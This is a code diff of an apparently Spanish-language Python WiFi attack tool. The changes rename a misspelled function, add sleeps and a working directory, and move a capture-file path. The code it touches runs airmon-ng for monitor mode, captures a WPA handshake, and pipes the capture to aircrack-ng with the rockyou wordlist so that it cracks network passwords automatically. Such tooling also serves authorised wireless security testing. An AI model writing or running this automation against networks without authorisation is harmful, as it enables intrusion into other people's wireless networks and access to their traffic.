@@ -32,7 +32,8 @@ def exiting(err):
     else:
         print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
 
-    print(Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Restarting network services" + Fore.YELLOW +
+    print(Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Restarting network services"
+          + Fore.YELLOW +
           Fore.WHITE + "\n  ·  ·  ·  · " + "[*] " + Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET)
     try:
         if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
@@ -125,6 +126,11 @@ def monitor_mode(choosed_interface):
 def list_save_interf():
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "Mostrando Intefaces Disponibles...")
 
+    direc = "espec"
+
+    if not os.path.exists(direc):
+        os.makedirs(direc)
+    time.sleep(1)
     # Creamos archivo con interfaces disponibles
     os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > espec/iface")
     nums = 0
@@ -306,7 +312,7 @@ def prepare_attack(dict, network_to_attack):
 
     if not os.path.exists(direc):
         os.makedirs(direc)
-
+    time.sleep(1)
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Al capturar el " +
           Fore.RED + '"WPA handshake ' + Fore.LIGHTCYAN_EX +
           " parara solo. --->  [CTRL + C] to stop manually..." + Fore.RESET)
@@ -368,16 +374,18 @@ def capture_handshake(hand, evento, direc):
     else:
         evento.set()
         print(Fore.LIGHTCYAN_EX + "\n\n\n\n\t[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
-    crack_hanshake(direc)
+    crack_handshake(direc)
 
 
-def crack_hanshake(direc):
-    os.system("find {}/*.cap > capture_file".format(direc))
+def crack_handshake(direc):
+    os.system("find {}/*.cap > espec/capture_file".format(direc))
 
-    with open("capture_file", "r") as file:
+    with open("espec/capture_file", "r") as file:
         file = file.read().strip()
+
     print(Fore.YELLOW + "\n\t[!] " + Fore.LIGHTCYAN_EX + "Abriendo archivo '.cap'\n" + Fore.RESET)
-    input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
+    #input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
+    time.sleep(3)
     crack = subprocess.Popen(["aircrack-ng", file, "-w", "words/rockyou.txt"], stdout=subprocess.PIPE)
 
     while True:
